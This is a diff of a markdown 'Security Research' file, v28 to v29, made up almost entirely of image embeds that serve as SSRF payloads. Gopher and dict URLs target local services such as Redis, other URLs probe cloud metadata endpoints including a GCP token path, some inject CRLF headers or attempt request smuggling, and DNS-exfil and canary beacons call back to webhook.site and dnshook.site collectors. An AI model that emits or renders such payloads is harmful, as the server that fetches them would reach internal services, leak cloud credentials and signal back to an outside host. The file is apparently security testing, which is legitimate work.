@@ -1,171 +1,152 @@
-# Security Research - v28
+# Security Research - v29
 
-## Unicode, Subdomain and Encoding Attacks
+## Protocol & Advanced Attacks
 
-Testing advanced URL manipulation attacks.
-
----
-
-### 1) Unicode Homoglyph in Host (ⓛocalhost)
-
-Using Unicode fullwidth/circled characters:
-
-![homoglyph](https://webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/homoglyph.gif)
+Testing protocol-level and advanced SSRF techniques.
 
 ---
 
-### 2) Subdomain Confusion - localhost.attacker.com
+### 1) Gopher Protocol
 
-Using localhost as subdomain:
+SSRF classic - gopher can craft arbitrary TCP:
 
-![subdomain](https://localhost.6c7992c7-e55e-4d41-ab82-a55c6f411ce2.dnshook.site/subdomain.gif)
-
----
-
-### 3) 127.0.0.1 as Subdomain
-
-![ip-subdomain](https://127.0.0.1.6c7992c7-e55e-4d41-ab82-a55c6f411ce2.dnshook.site/ip-subdomain.gif)
+![gopher](gopher://127.0.0.1:9000/_GET%20/%20HTTP/1.0%0d%0a%0d%0a)
 
 ---
 
-### 4) Internal IP in Fragment Before Path
+### 2) Dict Protocol
 
-Fragment confusion:
+Dict protocol for port scanning:
 
-![fragment](https://webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2#@127.0.0.1/fragment.gif)
-
----
-
-### 5) Backslash in URL
-
-Some parsers treat \ as /:
-
-![backslash](https://webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2\@127.0.0.1/backslash.gif)
+![dict](dict://127.0.0.1:6379/INFO)
 
 ---
 
-### 6) Triple-Encoded URL
+### 3) LDAP Protocol
 
-Triple URL encoding:
-
-![triple](https://webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/%25%32%35%37%46%25%32%35%37%46127.0.0.1/triple.gif)
+![ldap](ldap://127.0.0.1:389/)
 
 ---
 
-### 7) URL with Null Byte
+### 4) TFTP Protocol
 
-Null byte injection:
-
-![null](https://webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/%00@127.0.0.1/null.gif)
+![tftp](tftp://127.0.0.1/test)
 
 ---
 
-### 8) URL with Tab/Newline
+### 5) FTP Protocol
 
-Whitespace injection:
-
-![whitespace](https://webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/%09%0a@127.0.0.1/whitespace.gif)
+![ftp](ftp://127.0.0.1/)
 
 ---
 
-### 9) Scheme Confusion (http:80)
+### 6) CRLF Injection in URL
 
-Port in scheme area:
+Attempt CRLF in path:
 
-![scheme](http:80//webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/scheme.gif)
-
----
-
-### 10) Authority Confusion with Multiple @
-
-Multiple @ signs:
-
-![multi-at](https://user@127.0.0.1@webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/multi-at.gif)
+![crlf](https://webhook.site/dfe7c107-9e29-45d2-b866-cf64a684164e/test%0d%0aX-Injected:%20header%0d%0a%0d%0a/crlf.gif)
 
 ---
 
-### 11) IPv6 Zone ID Attack
+### 7) HTTP Request Smuggling via URL
 
-IPv6 zone identifier:
+Attempt smuggling in path:
 
-![zone](http://[::1%25eth0]:80/zone.gif)
-
----
-
-### 12) Unicode Right-to-Left Override
-
-RTL override attack:
-
-![rtl](https://webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/moc.1.0.0.721\u202e/rtl.gif)
+![smuggle](https://webhook.site/dfe7c107-9e29-45d2-b866-cf64a684164e/test%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0aGET%20/smuggled.gif)
 
 ---
 
-### 13) IDNA (Punycode) Domain
+### 8) Connection: Keep-Alive Pipeline
 
-Internationalized domain:
-
-![idna](http://xn--n3h.com/idna.gif)
+![keepalive](https://webhook.site/dfe7c107-9e29-45d2-b866-cf64a684164e/keepalive.gif)
 
 ---
 
-### 14) Open Redirect via OAuth-style URL
+### 9) URL with Different Case Scheme
 
-Using redirect_uri pattern:
+![HTTP-case](HTTP://webhook.site/dfe7c107-9e29-45d2-b866-cf64a684164e/http-case.gif)
 
-![oauth](https://httpbin.org/redirect-to?url=https://webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/oauth-redirect.gif)
-
----
-
-### 15) Port 0 (Invalid Port)
-
-![port0](http://webhook.site:0/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/port0.gif)
+![hTtP-case](hTtP://webhook.site/dfe7c107-9e29-45d2-b866-cf64a684164e/http-mixed.gif)
 
 ---
 
-### 16) Port 65536 (Out of Range)
+### 10) Double Slash Normalization
 
-![port-overflow](http://webhook.site:65536/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/port-overflow.gif)
-
----
-
-### 17) Hostname with Space (%20)
-
-![space-host](http://webhook%20.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/space-host.gif)
+![doubleslash](https://webhook.site//dfe7c107-9e29-45d2-b866-cf64a684164e//doubleslash.gif)
 
 ---
 
-### 18) Special Kubernetes DNS
+### 11) URL with Backslash in Host
 
-Kubernetes internal DNS:
-
-![k8s](http://kubernetes.default.svc.cluster.local/k8s.gif)
+![backslash-host](https://webhook.site\@127.0.0.1/backslash-host.gif)
 
 ---
 
-### 19) AWS EC2 Instance Identity Document
+### 12) Tab Character in Host
 
-EC2 instance metadata:
-
-![ec2-id](http://169.254.169.254/latest/dynamic/instance-identity/document/ec2.gif)
+![tab-host](https://webhook	.site/dfe7c107-9e29-45d2-b866-cf64a684164e/tab-host.gif)
 
 ---
 
-### 20) GCP Service Account Token
+### 13) Semicolon as Path Separator
 
-GCP metadata:
+![semicolon](https://webhook.site/dfe7c107-9e29-45d2-b866-cf64a684164e;@127.0.0.1/semicolon.gif)
 
-![gcp-token](http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token/gcp.gif)
+---
+
+### 14) IPv4-in-IPv6 Format
+
+![ipv4-in-ipv6](http://[::ffff:127.0.0.1]/ipv4-in-ipv6.gif)
+
+---
+
+### 15) Long URL Overflow Test
+
+Extremely long path:
+
+![longurl](https://webhook.site/dfe7c107-9e29-45d2-b866-cf64a684164e/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/longurl.gif)
+
+---
+
+### 16) URL with Username Only (No Password)
+
+![user-only](https://user@webhook.site/dfe7c107-9e29-45d2-b866-cf64a684164e/user-only.gif)
+
+---
+
+### 17) Percent-Encoded Scheme
+
+![encoded-scheme](%68%74%74%70%73://webhook.site/dfe7c107-9e29-45d2-b866-cf64a684164e/encoded-scheme.gif)
+
+---
+
+### 18) Unicode Normalization (NFC vs NFD)
+
+![nfc](https://webhook.site/dfe7c107-9e29-45d2-b866-cf64a684164e/café-nfc.gif)
+![nfd](https://webhook.site/dfe7c107-9e29-45d2-b866-cf64a684164e/cafe\u0301-nfd.gif)
+
+---
+
+### 19) HTTP/2 Pseudo-Header Injection
+
+![h2-inject](https://webhook.site/dfe7c107-9e29-45d2-b866-cf64a684164e/:path/h2-inject.gif)
+
+---
+
+### 20) URL Fragment with Query String
+
+![fragment-query](https://webhook.site/dfe7c107-9e29-45d2-b866-cf64a684164e/test.gif?foo=bar#baz?internal=http://127.0.0.1)
 
 ---
 
 ### DNS Exfil
 
-![dns](https://v28-dns.6c7992c7-e55e-4d41-ab82-a55c6f411ce2.dnshook.site/dns.gif)
+![dns](https://v29-dns.dfe7c107-9e29-45d2-b866-cf64a684164e.dnshook.site/dns.gif)
 
 ### Canary
 
-![canary](https://webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/v28-canary.gif)
+![canary](https://webhook.site/dfe7c107-9e29-45d2-b866-cf64a684164e/v29-canary.gif)
 
 ---
 
-*v28 - Unicode, subdomain and encoding attacks*
+*v29 - Protocol & advanced attacks*
